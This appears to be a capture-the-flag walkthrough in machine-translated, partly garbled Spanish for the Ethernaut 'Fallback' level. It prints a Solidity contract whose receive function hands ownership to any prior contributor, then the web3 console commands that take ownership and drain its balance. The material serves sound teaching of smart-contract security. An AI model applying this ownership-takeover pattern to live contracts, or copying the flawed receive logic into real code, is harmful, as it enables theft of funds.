Look carefully at the contract's code below.

You will beat this level if

you claim ownership of the contract
you reduce its balance to 0
  Things that might help

How to send ether when interacting with an ABI
How to send ether outside of the ABI
Converting to and from wei/ether units (see help() command)
Fallback methods

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}

y contractmétodos y web3.jsfunciones inyectados en la consola.

Nosotros, la playerdirección, tenemos que convertirnos ownerde alguna manera en el contrato y retirar todo el monto del contrato.

Las partes clave a notar son contributela función y la receivefunción alternativa del contrato.

Del constructor, se puede ver que ownerla contribución de es 1000 eth. Una forma de convertirse owneres enviar más del ownereth actual aportado para contributefuncionar como propietario. Verifiquemos ownerel eth contribuido usando la consola:

ownerAddr = await contract.owner();
await contract.contributions('0x9CB391dbcD447E645D6Cb55dE6ca23164130D008').then(v => v.toString())

// Output '1000000000000000000000'

¡Pero eso sería demasiado eth! No tenemos nada cerca.

Sin embargo, eche un vistazo a receivela función de respaldo. También tiene código para cambiar de dueño. Según qué código hay, podemos reclamar la propiedad si:

El contrato tiene una contribución distinta de cero por nuestra parte (es decir, player).
Luego, enviamos al contrato una cantidad eth distinta de cero.
playerla dirección tiene una contribución cero al contrato actualmente, así que satisfagamos la primera condición enviando menos de 0.001 eth (requerido según el código):

await contract.contribute.sendTransaction({ from: player, value: toWei('0.0009')})

Ahora tenemos una contribución distinta de cero que puede verificar mediante:

await contract.getContribution().then(v => v.toString())

Y ahora envíe cualquier cantidad de éter distinta de cero al contrato:

await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')})

¡Auge! ¡Reclamamos la propiedad del contrato!
Puede verificar que owneres la misma dirección que playerpor:

await contract.owner()
// Output: Same as player address

Y para el golpe final, retirar todo el saldo del contrato:
await contract.withdraw()
